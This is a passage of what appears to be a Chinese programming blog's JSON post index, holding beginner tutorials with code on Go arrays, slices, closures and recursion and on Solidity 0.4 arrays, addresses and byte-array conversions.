无论如何实现，以这种方式重用一个slice一般都要求最多为每个输入值产生一个输出值，事实上很多这类算法都是用来过滤或合并序列中相邻的元素。这种slice用法是比较复杂的技巧，虽然使用到了slice的一些技巧，但是对于某些场合是比较清晰和有效的。 一个slice可以用来模拟一个stack。最初给定的空slice对应一个空的stack，然后可以使用append函数将新的值压入stack： stack = append(stack, v) // push v stack的顶部位置对应slice的最后一个元素： top := stack[len(stack)-1] // top of stack 通过收缩stack可以弹出栈顶的元素 stack = stack[:len(stack)-1] // pop 要删除slice中间的某个元素并保存原有的元素顺序，可以通过内置的copy函数将后面的子slice向前依次移动一位完成： func remove(slice []int, i int) []int { copy(slice[i:], slice[i+1:]) return slice[:len(slice)-1] } func main() { s := []int{5, 6, 7, 8, 9} fmt.Println(remove(s, 2)) // “[5 6 8 9]” } 如果删除元素后不用保持原来顺序的话，我们可以简单的用最后一个元素覆盖被删除的元素： func remove(slice []int, i int) []int { slice[i] = slice[len(slice)-1] return slice[:len(slice)-1] } func main() { s := []int{5, 6, 7, 8, 9} fmt.Println(remove(s, 2)) // &quot;[5 6 9 8] }","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"solidity智能合约[22]-地址","slug":"solidity-22-addressAndPayable","date":"2018-11-19T16:44:11.000Z","updated":"2018-11-20T16:36:52.755Z","comments":true,"path":"2018/11/20/solidity-22-addressAndPayable/","link":"","permalink":"https://dreamerjonson.com/2018/11/20/solidity-22-addressAndPayable/","excerpt":"","text":"地址 solidity语言中有账户的概念，solidity语言中有两类账户。一类是合约账户、一类是外部账户。账户都有地址。地址为160位。 定义地址 address public account1 = 0x4B0897b0513fdC7C541B6d9D7E929C4e5364D2dB; address public account2 = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c; address底层以uint160存储 123456function changeIt() view public returns(uint160)&#123; return uint160(account2);//428365927726247537526132020791190998556166378203 &#125; function changeIt2() pure public returns(address)&#123; return address(1154414090619811796818182302139415280051214250812);//0x4B0897b0513fdC7C541B6d9D7E929C4e5364D2dB&#125; 地址比较 地址可以进行比较，和整数比较大小类似。 1234567891011121314function check1() view public returns(bool)&#123; return account1&gt;account2; &#125; function check2() view public returns(bool)&#123; return account1&gt;=account2; &#125; function check3() view public returns(bool)&#123; return account1&lt;=account2; &#125; function check4() view public returns(bool)&#123; return account1&lt;=account2; &#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[21]-数组字面量","slug":"solidity-21-arrayiterator","date":"2018-11-19T16:20:07.000Z","updated":"2018-11-20T16:36:56.517Z","comments":true,"path":"2018/11/20/solidity-21-arrayiterator/","link":"","permalink":"https://dreamerjonson.com/2018/11/20/solidity-21-arrayiterator/","excerpt":"","text":"数组字面量特点 1、数组字面量类似与一个常量数组，不能修改大小和长度，例如[1,2,3] 2、数组字面量满足最小匹配原则，意味着[1,2,3]存储的类型为uint8，[256,2,3]存储的类型为uint16。Solidity会自动的匹配最小的能够容纳的类型 3、如果要改变类型的大小，如[1,2,3]中类型为uint256，那么我们可以强制转换为[uint(1),2,3]。 代码例子如下 1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.23;contract ArrayLiterals&#123; // function getarrayLiteratel() returns(uint[3])&#123; // return [1,2,3]; // &#125; // function getarrayLiteratel() returns(uint[3])&#123; // return [256,2,3]; // &#125; function getarrayLiteratel() public pure returns(uint8[3])&#123; return [1,2,3]; &#125; function getarrayLiteratel2() public pure returns(uint16[3])&#123; return [256,2,3]; &#125; function getarrayLiteratel3() public pure returns(uint[3])&#123; return [uint(1),2,3]; &#125; //可以传递数组字面量，在remix调用栏中输入[1,2,3] function getarrayLiteratel3(uint[3] grade) public pure returns(uint)&#123; uint sum = 0; for(uint i = 0;i&lt;grade.length;i++)&#123; sum+=grade[i]; &#125; return sum; &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[20]-动态二维数组","slug":"solidity-20-dynamictwoarray","date":"2018-11-19T16:11:58.000Z","updated":"2018-11-20T16:37:00.208Z","comments":true,"path":"2018/11/20/solidity-20-dynamictwoarray/","link":"","permalink":"https://dreamerjonson.com/2018/11/20/solidity-20-dynamictwoarray/","excerpt":"","text":"动态二维数组定义 uint[][] public grade = [[60,80],[40,20],[50,50]]; 获取长度 123456789function getLength() view public returns(uint)&#123; return grade.length; &#125; function getLength2() view public returns(uint)&#123; return grade[0].length; &#125; 修改长度 12345678910111213141516function changeLength() public&#123; grade.length = 4; &#125; function changeLength2() public&#123; grade.length =2; &#125; function changeLength3() public&#123; grade[0].length =3; &#125; function changeLength4() public&#123; grade[0].length =1; &#125; 添加修改内容 1234567function changeContent() public&#123; grade[1][0] = 100; &#125; function changeContent2() public&#123; grade.push([100,90]); &#125; 遍历内容 12345678910//获取内容并求和function add() view public returns(uint)&#123; uint sum = 0; for(uint i = 0;i&lt;3;i++)&#123; for(uint j = 0;j&lt;2;j++)&#123; sum+= grade[i][j]; &#125; &#125; return sum;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[19]-for循环","slug":"solidity-19-for","date":"2018-11-19T16:05:59.000Z","updated":"2018-11-20T16:37:04.578Z","comments":true,"path":"2018/11/20/solidity-19-for/","link":"","permalink":"https://dreamerjonson.com/2018/11/20/solidity-19-for/","excerpt":"","text":"for for 语句为&quot;当型&quot;循环结构。 for语句的语法为： 123for ( 表达式 1; 表达式 2; 表达式)&#123; 语句&#125; 说明： 表达式 1为循环变量赋初始值。 表达式 2为循环条件。 表达式 3为循环变量增值。 for循环打印斐波拉耶数列 123456789101112131415161718192021pragma solidity ^0.4.23;contract forTest&#123; //0,1,1,2,3,5,8,13,21 uint[] public arr=[1,1]; function getArr() public view returns(uint[])&#123; return arr; &#125; function fab() public&#123; for(uint i = 0;i&lt;10;i++)&#123; uint an = arr[arr.length-1]; uint bn = arr[arr.length-2]; uint sum = an+bn; arr.push(sum); &#125; &#125;&#125; 二维数组遍历与解释 1234567891011121314151617181920212223242526272829 uint[2][3] grade = [[60,80],[40,20],[50,50]];//获取内容并求和function add() view public returns(uint)&#123; uint sum = 0; //定义的时候和获取数据的时候有些差别，在获取数据的时候，第一个数字i代表的是i+1元素，第二个数据j代表的是i+1个元素内的第j+1个内容 //1、 i = 0 i&lt;3 //2、j=0 j &lt;2 //3、sum += grade[0][0];、sum += 60; //4、j++----&gt;j=1; //5.j&lt;2? //6.sum+=grade[0][1];sum += 80 //7.j++------j=2; //8.j&lt;2 //9.i++ ---&gt;i=1; //10.i&lt;3 //11.j = 0 //12.j&lt;2? //13.sum += grade[1][0] //14.j++ //15......... //最后遍历了grade[0][0]，grade[0][1]，grade[1][0]，grade[1][1]，grade[2][0]，grade[2][1] for(uint i = 0;i&lt;3;i++)&#123; for(uint j = 0;j&lt;2;j++)&#123; sum+= grade[i][j]; &#125; &#125; return sum;&#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[18]-twoarray","slug":"solidity-18-twoarray","date":"2018-11-19T15:56:34.000Z","updated":"2018-11-20T16:37:08.105Z","comments":true,"path":"2018/11/19/solidity-18-twoarray/","link":"","permalink":"https://dreamerjonson.com/2018/11/19/solidity-18-twoarray/","excerpt":"","text":"二维数组定义 1uint[2][3] grade = [[60,80],[40,20],[50,50]]; 返回二维数组 1234function getGrade() view public returns(uint[2][3])&#123; return grade;&#125; 获取二维数组长度 123456789function getLength() view public returns(uint)&#123; return grade.length;&#125; function getLength2() view public returns(uint)&#123; return grade[0].length;&#125; 改变内容 1234567function changeContent() public &#123; grade[0][1] = 100; // grade.push(ericGrade); // grade[0][2]=90; &#125; 完整代码演示 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374pragma solidity ^0.4.23;contract twoArray&#123; // uint[2] jonsongrade = [60,80]; uint[2] ericGrade = [40,20]; // uint[2] stevenGrade = [50,50]; uint[2][3] grade = [[60,80],[40,20],[50,50]]; function getGrade() view public returns(uint[2][3])&#123; return grade; &#125; function getLength() view public returns(uint)&#123; return grade.length; &#125; function getLength2() view public returns(uint)&#123; return grade[0].length; &#125; // function changelength() public &#123; // grade[0].length =10; // &#125; function changeContent() public &#123; grade[0][1] = 100; // grade.push(ericGrade); // grade[0][2]=90; &#125; //获取内容并求和 function add() view public returns(uint)&#123; uint sum = 0; //定义的时候和获取数据的时候有些差别，在获取数据的时候，第一个数字i代表的是i+1元素，第二个数据j代表的是i+1个元素内的第j+1个内容 //1、 i = 0 i&lt;3 //2、j=0 j &lt;2 //3、sum += grade[0][0];、sum += 60; //4、j++----&gt;j=1; //5.j&lt;2? //6.sum+=grade[0][1];sum += 80 //7.j++------j=2; //8.j&lt;2 //9.i++ ---&gt;i=1; //10.i&lt;3 //11.j = 0 //12.j&lt;2? //13.sum += grade[1][0] //14.j++ //15......... //最后遍历了grade[0][0]，grade[0][1]，grade[1][0]，grade[1][1]，grade[2][0]，grade[2][1] for(uint i = 0;i&lt;3;i++)&#123; for(uint j = 0;j&lt;2;j++)&#123; sum+= grade[i][j]; &#125; &#125; return sum; &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[17]-动态长度数组","slug":"solidity-17-dynamicarray","date":"2018-11-19T15:44:41.000Z","updated":"2018-11-20T16:37:11.790Z","comments":true,"path":"2018/11/19/solidity-17-dynamicarray/","link":"","permalink":"https://dreamerjonson.com/2018/11/19/solidity-17-dynamicarray/","excerpt":"","text":"动态长度数组 动态长度数组可以改变大小和长度 动态长度数组的定义 uint[] grade=[1,2,3,4,5]; 返回动态长度数组 123function getArray() public view returns(uint[])&#123; return grade; &#125; 获取动态数组长度 123function getlength() public view returns(uint)&#123; return grade.length;&#125; 遍历动态长度数组 123456789function cheng() public view returns(uint)&#123; uint result = 1; for(uint i = 0;i&lt;grade.length;i++)&#123; result *= grade[i]; // result = result * grade[i] &#125; return result;&#125; 改变动态数组长度 123456789101112//截断function changeLength() public &#123; grade.length = 3;&#125; function changeLength2() public &#123; grade.length = 5;&#125; function pushelement() public &#123; grade.push(99);&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[16]-固定长度数组","slug":"solidity-16-fixarray","date":"2018-11-19T15:35:40.000Z","updated":"2018-11-20T16:37:15.352Z","comments":true,"path":"2018/11/19/solidity-16-fixarray/","link":"","permalink":"https://dreamerjonson.com/2018/11/19/solidity-16-fixarray/","excerpt":"","text":"数组 内存中的一片连续区域 定义 12int[7] math;bytes2[3] bytesTest; 赋值 1uint[5] public grade =[1,2,3,4,5]; 修改内容 123function init2() public &#123; bytesTest[1] = 0x6a6f;&#125; 返回数组 1234function getArray2() public view returns(bytes2[3])&#123;return bytesTest;&#125; 获取数组长度 1234function getlength() public view returns(uint)&#123; return grade.length; &#125; 数组遍历求和 1234567function add() public view returns(uint)&#123; uint sum= 0 ; for(uint i = 0;i&lt;5;i++)&#123; sum+=grade[i]; &#125; return sum;&#125; 错误代码 固定数组不能修改大小和内容 1234567891011// function getlength2() public&#123;// grade.length =90;// &#125;// function pushelement() public &#123;// grade.push(90);// &#125; 完整例子 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152pragma solidity ^0.4.23;contract arrayTest&#123; uint[5] public grade =[1,2,3,4,5]; int[7] math; bytes2[3] bytesTest; function init2() public &#123; bytesTest[1] = 0x6a6f; &#125; function getArray2() public view returns(bytes2[3])&#123; return bytesTest; &#125; function init() public &#123; grade[0] = 100; grade[1] = 200; &#125; function getArray() public view returns(uint[5])&#123; return grade; &#125; function add() public view returns(uint)&#123; uint sum= 0 ; for(uint i = 0;i&lt;5;i++)&#123; sum+=grade[i]; &#125; return sum; &#125; function getlength() public view returns(uint)&#123; return grade.length; &#125; // function getlength2() public&#123; // grade.length =90; // &#125; // function pushelement() public &#123; // grade.push(90); // &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[15]-fixtostring","slug":"solidity-15-fixtostring","date":"2018-11-19T15:24:30.000Z","updated":"2018-11-20T16:37:19.032Z","comments":true,"path":"2018/11/19/solidity-15-fixtostring/","link":"","permalink":"https://dreamerjonson.com/2018/11/19/solidity-15-fixtostring/","excerpt":"","text":"固定字节数组转string 固定字节数组转换为string没有好的办法，必须要首先将固定字节数组转换为动态字节数组，再将动态字节数组转换为string 123456789101112//bytes2 -&gt; bytes ----&gt;string function fixtostr(bytes32 _newname) pure public returns(string)&#123; bytes memory newName = new bytes(_newname.length); for(uint i = 0;i&lt;newName.length;i++)&#123; newName[i] = _newname[i]; &#125; return string(newName);&#125; 上面的函数传递0x6a6f的时候，返回的结果为&quot;bytes32 newname&quot;: &quot;0x6a6f000000000000000000000000000000000000000000000000000000000000 这显然不是我们想要的。这是由于新建的动态数组的长度为32的原因。下面对其进行改进： 123456789101112131415161718function fixtostr2(bytes32 _newname) pure public returns(string)&#123; //计数 uint count = 0 ; for(uint i = 0;i&lt;_newname.length;i++)&#123; bytes1 ch = _newname[i]; if(ch !=0)&#123; count++; &#125; &#125; bytes memory name2 = new bytes(count); for(uint j = 0;j&lt;name2.length;j++)&#123; name2[j] = _newname[j]; &#125; return string(name2);&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[14]-动态字节数组转换为string","slug":"solidity-14-dynamictostring","date":"2018-11-19T15:19:50.000Z","updated":"2018-11-20T16:37:22.966Z","comments":true,"path":"2018/11/19/solidity-14-dynamictostring/","link":"","permalink":"https://dreamerjonson.com/2018/11/19/solidity-14-dynamictostring/","excerpt":"","text":"动态字节数组转换为string 动态字节数组可以通过string(name)非常直接的转换为string类型，下面为例子： 1234567891011121314pragma solidity ^0.4.23;contract dynamicTostring&#123; bytes name = new bytes(2); function InitName() public&#123; name[0] = 0x6a; name[1] = 0x6f; &#125; function dynamictostr() view public returns(string)&#123; return string(name); &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[13]-固定字节数组转动态字节数组","slug":"solidity-13-fixtodynamic","date":"2018-11-19T15:11:30.000Z","updated":"2018-11-20T16:37:27.818Z","comments":true,"path":"2018/11/19/solidity-13-fixtodynamic/","link":"","permalink":"https://dreamerjonson.com/2018/11/19/solidity-13-fixtodynamic/","excerpt":"","text":"固定字节数组转动态字节数组 要将固定长度的字节数组转换为动态长度的字节数组，需要首先创建动态数组，并挨个赋值。 12345678910111213141516pragma solidity ^0.4.23;contract fixTodynamic&#123; bytes6 name = 0x6a6f6e736f6e; function Todynamic() view public returns(bytes)&#123; //return bytes(name); bytes memory newName = new bytes(name.length); //for循环挨个赋值 for(uint i = 0;i&lt;name.length;i++)&#123; newName[i] = name[i]; &#125; return newName; &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[12]-固定字节数组相互转换","slug":"solidity-12-fixByteConvertion","date":"2018-11-19T15:00:32.000Z","updated":"2018-11-20T16:37:31.871Z","comments":true,"path":"2018/11/19/solidity-12-fixByteConvertion/","link":"","permalink":"https://dreamerjonson.com/2018/11/19/solidity-12-fixByteConvertion/","excerpt":"","text":"固定字节数组相互转换 固定长度字节数组之间能够进行相互转换 1234567891011121314151617181920pragma solidity ^0.4.23;contract fixTofix&#123; bytes6 name = 0x6a6f6e736f6e; //bytes1: 0x6a function Tobytes1() view public returns(bytes1)&#123; return bytes1(name); &#125; //bytes2: 0x6a6f function Tobytes2() view public returns(bytes2)&#123; return bytes2(name); &#125; // bytes8: 0x6a6f6e736f6e0000 function Tobytes3() view public returns(bytes8)&#123; return bytes8(name); &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"go语言渐入佳境[12]-array","slug":"golang-12-array","date":"2018-11-19T11:06:51.000Z","updated":"2019-02-15T14:42:22.021Z","comments":true,"path":"2018/11/19/golang-12-array/","link":"","permalink":"https://dreamerjonson.com/2018/11/19/golang-12-array/","excerpt":"","text":"数组声明与定义 1234//声明三种方式var arr [3]intvar arr2 = [4]int&#123;1,2,3,4&#125;arr4 :=[...] int&#123;2,3,4&#125; 打印数组 1fmt.Println(arr4) 数组类型 1fmt.Printf(&quot;类型arr3: %T,类型arr4: %T\\n&quot;,arr3,arr4) 数组长度与下标 12fmt.Println(&quot;arr3的长度为：&quot;,len(arr3))fmt.Println(&quot;arr3的下标为2：&quot;,arr3[2]) ##遍历数组两种方式 12345678910//遍历数组for i:=0;i&lt;len(arr3);i++&#123; fmt.Println(arr3[i])&#125;//遍历数组2for _,value:=range arr3&#123; fmt.Println(value)&#125; 冒泡排序 1234567891011121314151617181920212223//冒泡排序func array()&#123; arr :=[10]int&#123;1,3,2,4,9,2,6,5,4,8&#125; fmt.Println(\"一开始：\",arr) for i:=0;i&lt;len(arr)-1;i++&#123; for j:=0;j&lt;len(arr)-1-i;j++&#123; if(arr[j] &gt;arr[j+1])&#123; temp:=arr[j] arr[j] = arr[j+1] arr[j+1] = temp &#125; fmt.Println(arr) &#125; &#125; fmt.Println(\"结束：\",arr)&#125; 二维数组 1234567891011func twoarray()&#123; a :=[3][3]int&#123;&#123;1,2,3&#125;,&#123;4,5,6&#125;,&#123;7,8,9&#125;&#125; for i:=0;i&lt;len(a);i++&#123; for j:=0;j&lt;len(a[0]);j++&#123; fmt.Printf(\"a[%d][%d]=%d\\n\",i,j,a[i][j]) &#125; &#125;&#125; 全部例子代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package mainimport \"fmt\"//声明var arr [3]intvar arr2 = [4]int&#123;1,2,3,4&#125;func main()&#123; arr3 := [4]float64&#123;1,2,3,4&#125; fmt.Println(arr3) arr4 :=[...] int&#123;2,3,4&#125; fmt.Println(arr4) fmt.Printf(\"类型arr3: %T,类型arr4: %T\\n\",arr3,arr4) fmt.Println(\"arr3的长度为：\",len(arr3)) fmt.Println(\"arr3的下标为2：\",arr3[2]) //遍历数组 for i:=0;i&lt;len(arr3);i++&#123; fmt.Println(arr3[i]) &#125; //遍历数组2 for _,value:=range arr3&#123; fmt.Println(value) &#125; array() twoarray()&#125;//冒泡排序func array()&#123; arr :=[10]int&#123;1,3,2,4,9,2,6,5,4,8&#125; fmt.Println(\"一开始：\",arr) for i:=0;i&lt;len(arr)-1;i++&#123; for j:=0;j&lt;len(arr)-1-i;j++&#123; if(arr[j] &gt;arr[j+1])&#123; temp:=arr[j] arr[j] = arr[j+1] arr[j+1] = temp &#125; fmt.Println(arr) &#125; &#125; fmt.Println(\"结束：\",arr)&#125;func twoarray()&#123; a :=[3][3]int&#123;&#123;1,2,3&#125;,&#123;4,5,6&#125;,&#123;7,8,9&#125;&#125; for i:=0;i&lt;len(a);i++&#123; for j:=0;j&lt;len(a[0]);j++&#123; fmt.Printf(\"a[%d][%d]=%d\\n\",i,j,a[i][j]) &#125; &#125;&#125; 数组是一个由固定长度的特定类型元素组成的序列，一个数组可以由零个或多个元素组成。因为数组的长度是固定的，因此在Go语言中很少直接使用数组。和数组对应的类型是Slice（切片），它是可以增长和收缩动态序列，slice功能也更灵活，但是要理解slice工作原理的话需要先理解数组。 数组的每个元素可以通过索引下标来访问，索引下标的范围是从0开始到数组长度减1的位置。内置的len函数将返回数组中元素的个数。 12345678910111213var a [3]int // array of 3 integersfmt.Println(a[0]) // print the first elementfmt.Println(a[len(a)-1]) // print the last element, a[2]// Print the indices and elements.for i, v := range a &#123; fmt.Printf(\"%d %d\\n\", i, v)&#125;// Print the elements only.for _, v := range a &#123; fmt.Printf(\"%d\\n\", v)&#125; 默认情况下，数组的每个元素都被初始化为元素类型对应的零值，对于数字类型来说就是0。我们也可以使用数组字面值语法用一组值来初始化数组： var q [3]int = [3]int{1, 2, 3} var r [3]int = [3]int{1, 2} fmt.Println(r[2]) // “0” 在数组字面值中，如果在数组的长度位置出现的是“…”省略号，则表示数组的长度是根据初始化值的个数来计算。因此，上面q数组的定义可以简化为 q := […]int{1, 2, 3} fmt.Printf(&quot;%T\\n&quot;, q) // “[3]int” 数组的长度是数组类型的一个组成部分，因此[3]int和[4]int是两种不同的数组类型。数组的长度必须是常量表达式，因为数组的长度需要在编译阶段确定。 q := [3]int{1, 2, 3} q = [4]int{1, 2, 3, 4} // compile error: cannot assign [4]int to [3]int 我们将会发现，数组、slice、map和结构体字面值的写法都很相似。上面的形式是直接提供顺序初始化值序列，但是也可以指定一个索引和对应值列表的方式初始化，就像下面这样： type Currency int const ( USD Currency = iota // 美元 EUR // 歐元 GBP // 英鎊 RMB // 人民幣 ) symbol := […]string{USD: “$”, EUR: “€”, GBP: “￡”, RMB: “￥”} fmt.Println(RMB, symbol[RMB]) // “3 ￥” 在这种形式的数组字面值形式中，初始化索引的顺序是无关紧要的，而且没用到的索引可以省略，和前面提到的规则一样，未指定初始值的元素将用零值初始化。例如， r := […]int{99: -1} 定义了一个含有100个元素的数组r，最后一个元素被初始化为-1，其它元素都是用0初始化。 如果一个数组的元素类型是可以相互比较的，那么数组类型也是可以相互比较的，这时候我们可以直接通过==比较运算符来比较两个数组，只有当两个数组的所有元素都是相等的时候数组才是相等的。不相等比较运算符!=遵循同样的规则。 a := [2]int{1, 2} b := […]int{1, 2} c := [2]int{1, 3} fmt.Println(a == b, a == c, b == c) // “true false false” d := [3]int{1, 2} fmt.Println(a == d) // compile error: cannot compare [2]int == [3]int 作为一个眞实的例子，crypto/sha256包的Sum256函数对一个任意的字节slice类型的数据生成一个对应的消息摘要。消息摘要有256bit大小，因此对应[32]byte数组类型。如果两个消息摘要是相同的，那么可以认为两个消息本身也是相同（译注：理论上有HASH码碰撞的情况，但是实际应用可以基本忽略）；如果消息摘要不同，那么消息本身必然也是不同的。下面的例子用SHA256算法分别生成“x”和“X”两个信息的摘要： 12345678910111213import &quot;crypto/sha256&quot;func main() &#123; c1 := sha256.Sum256([]byte(&quot;x&quot;)) c2 := sha256.Sum256([]byte(&quot;X&quot;)) fmt.Printf(&quot;%x\\n%x\\n%t\\n%T\\n&quot;, c1, c2, c1 == c2, c1) // Output: // 2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881 // 4b68ab3847feda7d6c62c1fbcbeebfa35eab7351ed5e78f4ddadea5df64b8015 // false // [32]uint8&#125; 上面例子中，两个消息虽然只有一个字符的差异，但是生成的消息摘要则几乎有一半的bit位是不相同的。需要注意Printf函数的%x副词参数，它用于指定以十六进制的格式打印数组或slice全部的元素，%t副词参数是用于打印布尔型数据，%T副词参数是用于显示一个值对应的数据类型。 当调用一个函数的时候，函数的每个调用参数将会被赋值给函数内部的参数变量，所以函数参数变量接收的是一个复制的副本，并不是原始调用的变量。因为函数参数传递的机制导致传递大的数组类型将是低效的，并且对数组参数的任何的修改都是发生在复制的数组上，并不能直接修改调用时原始的数组变量。在这个方面，Go语言对待数组的方式和其它很多编程语言不同，其它编程语言可能会隐式地将数组作为引用或指针对象传入被调用的函数。 当然，我们可以显式地传入一个数组指针，那样的话函数通过指针对数组的任何修改都可以直接反馈到调用者。下面的函数用于给[32]byte类型的数组清零： 123456789func zero(ptr *[32]byte) &#123; for i := range ptr &#123; ptr[i] = 0 &#125;&#125;//其实数组字面值[32]byte&#123;&#125;就可以生成一个32字节的数组。而且每个数组的元素都是零值初始化，也就是0。因此，我们可以将上面的zero函数写的更简洁一点：func zero(ptr *[32]byte) &#123; *ptr = [32]byte&#123;&#125;&#125; 虽然通过指针来传递数组参数是高效的，而且也允许在函数内部修改数组的值，但是数组依然是僵化的类型，因为数组的类型包含了僵化的长度信息。上面的zero函数并不能接收指向[16]byte类型数组的指针，而且也没有任何添加或删除数组元素的方法。由于这些原因，除了像SHA256这类需要处理特定大小数组的特例外，数组依然很少用作函数参数；相反，我们一般使用slice来替代数组。","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[11]-function2","slug":"golang-11-function2","date":"2018-11-19T07:18:21.000Z","updated":"2018-11-20T02:43:42.178Z","comments":true,"path":"2018/11/19/golang-11-function2/","link":"","permalink":"https://dreamerjonson.com/2018/11/19/golang-11-function2/","excerpt":"","text":"匿名函数 123456789101112131415161718192021222324252627282930313233package mainimport ( \"fmt\" \"math\")//匿名函数func main()&#123; //无参匿名函数 func()&#123; fmt.Println(\"jonson\") &#125;() //有参匿名函数 func(data int)&#123; fmt.Println(\"data:\",data) &#125;(5) //有返回值的匿名函数 result:=func(data float64) float64&#123; return math.Sqrt(data) &#125;(9) fmt.Println(\"result:\",result) //函数表达式 greet:=func()&#123; fmt.Println(\"greet jonson\") &#125; greet() fmt.Printf(\"greet的类型是%T\\n\",greet) 闭包 1234567891011func greetjonson()&#123; x:=0 increment:= func() int&#123; x++ return x &#125; fmt.Println(increment()) fmt.Println(increment())&#125; 函数作为返回值 123456func makeGreeter() func() string&#123; return func() string &#123; return \"hello jonson\" &#125;&#125; 闭包与函数返回值 1234567func makeEvenGenerator() func() int&#123; i:=0 return func() int&#123; i+=2 return i &#125;&#125; callback函数作为参数 123456func visit(numbers []int,callback func(int))&#123; for _,n :=range numbers&#123; callback(n) &#125;&#125; 递归 12345678910111213141516171819202122// 计算阶乘 5 5*4*3*2*1func factorial(x uint) uint&#123; if x==0&#123; return 1 &#125; return x * factorial(x-1)&#125;// factorial(5) //120// returns: 5 * factorial(4)// factorial(4) /24// returns: 4 * factorial(3)// factorial(3) //6// returns: 3 * factorial(2)// factorial(2) //2// returns: 2 * factorial(1)// factorial(1) //1// returns: 1 * factorial(0)// factorial(0)// returns: 1 